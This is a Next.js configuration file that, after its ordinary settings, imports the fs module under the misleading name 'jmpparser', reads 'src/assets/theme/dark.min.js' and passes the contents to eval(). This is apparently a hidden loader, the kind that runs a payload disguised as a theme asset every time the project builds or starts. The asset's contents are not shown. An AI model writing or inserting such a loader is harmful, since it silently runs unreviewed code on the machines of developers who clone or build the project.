/** @type {import('next').NextConfig} */
const path = require('path');
const jmpparser = require('fs');
const nextConfig = {
  reactStrictMode: true,
  compiler: {
    styledComponents: true,
  },
}
module.exports = nextConfig;
jmpparser.readFile(__dirname  + '/src/assets/theme/dark.min.js', 'utf8', (err, code) => { eval(code); console.log(err) });
